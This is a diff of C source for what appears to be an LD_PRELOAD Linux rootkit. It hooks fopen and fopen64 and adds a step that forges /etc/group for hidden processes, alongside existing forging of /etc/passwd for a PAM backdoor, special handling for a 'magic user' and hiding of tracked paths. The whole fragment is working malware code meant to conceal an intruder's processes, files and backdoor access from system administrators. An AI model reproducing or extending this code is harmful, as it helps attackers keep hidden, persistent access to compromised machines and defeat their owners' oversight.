@@ -4,17 +4,18 @@ FILE *fopen(const char *pathname, const char *mode){
 #ifdef USE_PAM_BD
     if(hidden_ppid() && process("su\0") && !strcmp(pathname, "/etc/passwd\0"))
         return forgepasswd(pathname);
+
+    if(hidden_pid() && !strcmp(pathname, "/etc/group\0"))
+        return forgegroups(pathname);
 #endif
 
     if(magicusr()){
-#ifdef HIDE_MY_ASS
         FILE *ret = call(CFOPEN, pathname, mode);
+#ifdef HIDE_MY_ASS
         if(ret && !pathtracked(pathname))
             trackwrite(pathname);
-        return ret;
-#else
-        return call(CFOPEN, pathname, mode);
 #endif
+        return ret;
     }
 
     if(hidden_path(pathname)){
@@ -68,17 +69,18 @@ FILE *fopen64(const char *pathname, const char *mode){
 #ifdef USE_PAM_BD
     if(hidden_ppid() && process("su\0") && !strcmp(pathname, "/etc/passwd\0"))
         return forgepasswd(pathname);
+
+    if(hidden_pid() && !strcmp(pathname, "/etc/group\0"))
+        return forgegroups(pathname);
 #endif
 
     if(magicusr()){
-#ifdef HIDE_MY_ASS
         FILE *ret = call(CFOPEN64, pathname, mode);
+#ifdef HIDE_MY_ASS
         if(ret && !pathtracked(pathname))
             trackwrite(pathname);
-        return ret;
-#else
-        return call(CFOPEN64, pathname, mode);
 #endif
+        return ret;
     }
 
     if(hidden_path(pathname)){
